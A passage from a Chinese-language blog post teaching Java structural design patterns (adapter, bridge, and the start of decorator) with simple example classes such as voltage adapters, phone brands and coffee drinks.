href="#类适配器模式" class="headerlink" title="类适配器模式"></a>类适配器模式</h5><p>Adapter类  通过继承src类，实现dst类接口，完成src-&gt;dst的适配。</p><p><img src="https://cdn.jsdelivr.net/gh/a2914475618/github-jsdelivr-@main/img/20211013191204.png"></p><p>在我看来：类适配器模式就是通过适配器继承被适配的类，从而拿到该类的变量与方法，然后再实现一个要转换的目标接口，从而实现它的方法，重写方法时能够对被适配的类的功能进行修改，达到适配的功能。从而一个类依赖于目标接口，就可以达到适配的功能。</p><p>被适配的类</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//被适配的类</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Voltage220V</span> </span>&#123;</span><br><span class="line"><span class="comment">//输出220V的电压</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">output220V</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="keyword">int</span> src = <span class="number">220</span>;</span><br><span class="line">System.out.println(<span class="string">&quot;电压=&quot;</span> + src + <span class="string">&quot;伏&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> src;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>适配器类</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//适配器类</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">VoltageAdapter</span> <span class="keyword">extends</span> <span class="title">Voltage220V</span> <span class="keyword">implements</span> <span class="title">IVoltage5V</span> </span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">output5V</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="comment">// TODO Auto-generated method stub</span></span><br><span class="line"><span class="comment">//获取到220V电压</span></span><br><span class="line"><span class="keyword">int</span> srcV = output220V();</span><br><span class="line"><span class="keyword">int</span> dstV = srcV / <span class="number">44</span> ; <span class="comment">//转成 5v</span></span><br><span class="line"><span class="keyword">return</span> dstV;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>目标接口</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//适配接口</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">IVoltage5V</span> </span>&#123;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">output5V</span><span class="params">()</span></span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>依赖该接口的类   因为适配器类实现了该接口  所以可以直接依赖该适配器类进行适配</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Phone</span> </span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="comment">//充电</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">charging</span><span class="params">(IVoltage5V iVoltage5V)</span> </span>&#123;</span><br><span class="line"><span class="keyword">if</span>(iVoltage5V.output5V() == <span class="number">5</span>) &#123;</span><br><span class="line">System.out.println(<span class="string">&quot;电压为5V, 可以充电~~&quot;</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (iVoltage5V.output5V() &gt; <span class="number">5</span>) &#123;</span><br><span class="line">System.out.println(<span class="string">&quot;电压大于5V, 不能充电~~&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>Client类</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Client</span> </span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line"><span class="comment">// TODO Auto-generated method stub</span></span><br><span class="line">System.out.println(<span class="string">&quot; === 类适配器模式 ====&quot;</span>);</span><br><span class="line">Phone phone = <span class="keyword">new</span> Phone();</span><br><span class="line">phone.charging(<span class="keyword">new</span> VoltageAdapter());</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h5 id="对象适配器"><a href="#对象适配器" class="headerlink" title="对象适配器"></a>对象适配器</h5><ol><li>基本思路和类适配器相同，只是将适配器类做修改，不是继承src类，而是持有src类的实例，已解决兼容性的问题。</li><li>根据合成复用原则，再系统中尽量用关联关系来代替继承关系</li><li>对象适配器是适配器最常用的一种</li></ol><p><img src="https://cdn.jsdelivr.net/gh/a2914475618/github-jsdelivr-@main/img/20211014092444.png"></p><p>在我看来：也就是把类适配器里的继承改成了对象适配里的聚合，在适配器里引用了被适配的类的实例，其他没有改变。</p><p>被适配的类：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//被适配的类</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Voltage220V</span> </span>&#123;</span><br><span class="line"><span class="comment">//输出220V的电压，不变</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">output220V</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="keyword">int</span> src = <span class="number">220</span>;</span><br><span class="line">System.out.println(<span class="string">&quot;电压=&quot;</span> + src + <span class="string">&quot;伏&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> src;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>适配器类  注意：这里并没有继承被适配的类，而是关联了被适配的类的实例</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">VoltageAdapter</span>  <span class="keyword">implements</span> <span class="title">IVoltage5V</span> </span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> Voltage220V voltage220V; <span class="comment">// 关联关系-聚合</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//通过构造器，传入一个 Voltage220V 实例</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">VoltageAdapter</span><span class="params">(Voltage220V voltage220v)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">this</span>.voltage220V = voltage220v;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">output5V</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> dst = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">null</span> != voltage220V) &#123;</span><br><span class="line"><span class="keyword">int</span> src = voltage220V.output220V();<span class="comment">//获取220V 电压</span></span><br><span class="line">System.out.println(<span class="string">&quot;使用对象适配器，进行适配~~&quot;</span>);</span><br><span class="line">dst = src / <span class="number">44</span>;</span><br><span class="line">System.out.println(<span class="string">&quot;适配完成，输出的电压为=&quot;</span> + dst);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> dst;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>适配的接口：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">//适配接口</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">IVoltage5V</span> </span>&#123;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">output5V</span><span class="params">()</span></span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>依赖适配接口的类</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Phone</span> </span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="comment">//充电</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">charging</span><span class="params">(IVoltage5V iVoltage5V)</span> </span>&#123;</span><br><span class="line"><span class="keyword">if</span>(iVoltage5V.output5V() == <span class="number">5</span>) &#123;</span><br><span class="line">System.out.println(<span class="string">&quot;电压为5V, 可以充电~~&quot;</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (iVoltage5V.output5V() &gt; <span class="number">5</span>) &#123;</span><br><span class="line">System.out.println(<span class="string">&quot;电压大于5V, 不能充电~~&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Client类</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Client</span> </span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line"><span class="comment">// TODO Auto-generated method stub</span></span><br><span class="line">System.out.println(<span class="string">&quot; === 对象适配器模式 ====&quot;</span>);</span><br><span class="line">Phone phone = <span class="keyword">new</span> Phone();</span><br><span class="line">phone.charging(<span class="keyword">new</span> VoltageAdapter(<span class="keyword">new</span> Voltage220V()));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="接口适配器"><a href="#接口适配器" class="headerlink" title="接口适配器"></a>接口适配器</h5><p>又被称为缺省适配器模式</p><p>当不需要全部实现接口提供的方法时，可以设计一个抽象类接口，并为该接口中每个方法提供一个默认实现，那么该抽象类的子类可以有选择性的覆盖父类中的某些方法来实现需求</p><p>适用于一个接口不想适用其所有的方法的情况。</p><p><img src="https://cdn.jsdelivr.net/gh/a2914475618/github-jsdelivr-@main/img/20211014131230.png"></p><p>在我看来：也就是通过一个抽象的类实现接口，默认实现方法，然后子类继承重写需要的方法。这个抽象类就起到了适配的作用。</p><p>源接口</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">Interface4</span> </span>&#123;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">m1</span><span class="params">()</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">m2</span><span class="params">()</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">m3</span><span class="params">()</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">m4</span><span class="params">()</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>适配器类   抽象类  对接口的方法默认实现</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//在AbsAdapter 我们将 Interface4 的方法进行默认实现</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">AbsAdapter</span> <span class="keyword">implements</span> <span class="title">Interface4</span> </span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="comment">//默认实现</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">m1</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">m2</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">m3</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">m4</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>用匿名内部类重写自己关心的方法</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">public class Client &#123;</span><br><span class="line">public static void main(String[] args) &#123;</span><br><span class="line"></span><br><span class="line">AbsAdapter absAdapter &#x3D; new AbsAdapter() &#123;</span><br><span class="line">&#x2F;&#x2F;只需要去覆盖我们 需要使用 接口方法</span><br><span class="line">@Override</span><br><span class="line">public void m1() &#123;</span><br><span class="line">&#x2F;&#x2F; TODO Auto-generated method stub</span><br><span class="line">System.out.println(&quot;使用了m1的方法&quot;);</span><br><span class="line">&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">absAdapter.m1();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>适配器模式在Springmvc中Dispathche源码适用场景：</p><p><img src="https://cdn.jsdelivr.net/gh/a2914475618/github-jsdelivr-@main/img/20211014135033.png"></p><p>spring定义了一个适配接口就是图中的HandlerAdapter，里面核心的是support和handler两个方法。</p><p>DispathServlet从request中拿到controller类去HandlerAdapter类里找到对应的适配器类，该适配器代替controller执行相应的方法然后返回modelAndView。</p><h4 id="桥接模式"><a href="#桥接模式" class="headerlink" title="桥接模式"></a>桥接模式</h4><ol><li>将实现与抽象放在两个不同的类层次中，使得=两个层次可以独立改变。</li><li>一种结构性设计模式</li><li>Bridge模式基于类的最小设计原则，通过使用封装、聚合及继承等行为让不同的类承担不同的职责。主要特点就是把抽象与实现分离开来，从而可以保持各个部分的独立性</li></ol><p><img src="https://cdn.jsdelivr.net/gh/a2914475618/github-jsdelivr-@main/img/20211013165407.png"></p><p>在我看来也就是：将原来相耦合的两个类分离，然后用一个抽象类相当于桥，里面引用了一个接口，B类实现了接口的方法，A类继承了该抽象类，重写抽象类的方法。然后A类要调用B类的方法时，通过父类抽象类引用了接口，使得可以调用B类方法。从而抽象类就是桥的作用。</p><p>举个例子：</p><p>品牌 Brand  为一个接口</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">Brand</span> </span>&#123;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">open</span><span class="params">()</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">close</span><span class="params">()</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">call</span><span class="params">()</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>phone为一个抽象类,他聚合了Brand接口，他自己的方法本质上是调用了接口的方法，起到了桥的作用</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">Phone</span> </span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="comment">//组合品牌</span></span><br><span class="line"><span class="keyword">private</span> Brand brand;</span><br><span class="line"></span><br><span class="line"><span class="comment">//构造器</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">Phone</span><span class="params">(Brand brand)</span> </span>&#123;</span><br><span class="line"><span class="keyword">super</span>();</span><br><span class="line"><span class="keyword">this</span>.brand = brand;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">open</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="keyword">this</span>.brand.open();</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">close</span><span class="params">()</span> </span>&#123;</span><br><span class="line">brand.close();</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">call</span><span class="params">()</span> </span>&#123;</span><br><span class="line">brand.call();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>vivo类实现了Brand类</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Vivo</span> <span class="keyword">implements</span> <span class="title">Brand</span> </span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">open</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="comment">// TODO Auto-generated method stub</span></span><br><span class="line">System.out.println(<span class="string">&quot; Vivo手机开机 &quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">close</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="comment">// TODO Auto-generated method stub</span></span><br><span class="line">System.out.println(<span class="string">&quot; Vivo手机关机 &quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">call</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="comment">// TODO Auto-generated method stub</span></span><br><span class="line">System.out.println(<span class="string">&quot; Vivo手机打电话 &quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>折叠手机类继承了Phone类</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//折叠式手机类，继承 抽象类 Phone</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">FoldedPhone</span> <span class="keyword">extends</span> <span class="title">Phone</span> </span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="comment">//构造器</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">FoldedPhone</span><span class="params">(Brand brand)</span> </span>&#123;</span><br><span class="line"><span class="keyword">super</span>(brand);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">open</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="keyword">super</span>.open();</span><br><span class="line">System.out.println(<span class="string">&quot; 折叠样式手机 &quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">close</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="keyword">super</span>.close();</span><br><span class="line">System.out.println(<span class="string">&quot; 折叠样式手机 &quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">call</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="keyword">super</span>.call();</span><br><span class="line">System.out.println(<span class="string">&quot; 折叠样式手机 &quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>桥接模式在Jdbc中源码分析</p><p>jdbc中的Driver接口，如果从桥接模式来看，Driver就是一个接口，下面可以有Mysql的Driver，Oracle的Driver，这些就是接口实现类。</p><p>Driver和Connection之间是通过DriverMannger类进行桥接的。</p><p><img src="https://cdn.jsdelivr.net/gh/a2914475618/github-jsdelivr-@main/img/20211013182638.png"></p><p>适用场景：对于那些不希望使用继承或因为多层次继承导致系统类的个数急剧增加的系统，桥接模式尤为适用。</p><p>常见的场景（可分为两个维度）：</p><ol><li>jdbc驱动程序</li><li>银行转账系统<ol><li>转账分类</li><li>转账用户类型</li></ol></li><li>消息管理<ol><li>消息类型</li><li>消息分类</li></ol></li></ol><h4 id="装饰者模式"><a href="#装饰者模式" class="headerlink" title="装饰者模式"></a>装饰者模式</h4><p>定义：动态的将新功能附加到对象上。在对象扩展方面，它比继承更有弹性，装饰者模式也体现了开闭原则。</p><p>方案一：</p><p><img src="https://cdn.jsdelivr.net/gh/a2914475618/github-jsdelivr-@main/img/20211015091302.png"></p><p>尽管增加一个类是扩展，没有耦合，但是当增加一个调料时，就会增加更多的类，会引起类爆炸。</p><p>方案二：</p><p><img src="https://cdn.jsdelivr.net/gh/a2914475618/github-jsdelivr-@main/img/20211015091552.png"></p><p>将调料内置到抽象类中，子类继承时默认带有该调料。但是有些咖啡不一定有这种调料。所以还需要添加方法判断。在增加或者删除调料种类时，代码的维护量很大。</p><p>方案三：装饰者模式</p><p><img src="https://cdn.jsdelivr.net/gh/a2914475618/github-jsdelivr-@main/img/20211015091939.png"></p><p>在我看来：抽象类Drink就是一个最大的超类，然后让A类和B类都是他的子孙类，装饰器类继承+组合Drink类，从而B类就可以在构造方法中传入A类，起到装饰A类的作用。</p><p>Drink类 超类</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">Drink</span> </span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> String des; <span class="comment">// 描述</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">float</span> price = <span class="number">0.0f</span>;</span><br><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">getDes</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="keyword">return</span> des;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setDes</span><span class="params">(String des)</span> </span>&#123;</span><br><span class="line"><span class="keyword">this</span>.des = des;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">float</span> <span class="title">getPrice</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="keyword">return</span> price;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setPrice</span><span class="params">(<span class="keyword">float</span> price)</span> </span>&#123;</span><br><span class="line"><span class="keyword">this</span>.price = price;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//计算费用的抽象方法</span></span><br><span class="line"><span class="comment">//子类来实现</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">abstract</span> <span class="keyword">float</span> <span class="title">cost</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>Cof类</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Coffee</span>  <span class="keyword">extends</span> <span class="title">Drink</span> </span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">float</span> <span class="title">cost</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="comment">// TODO Auto-generated method stub</span></span><br><span class="line"><span 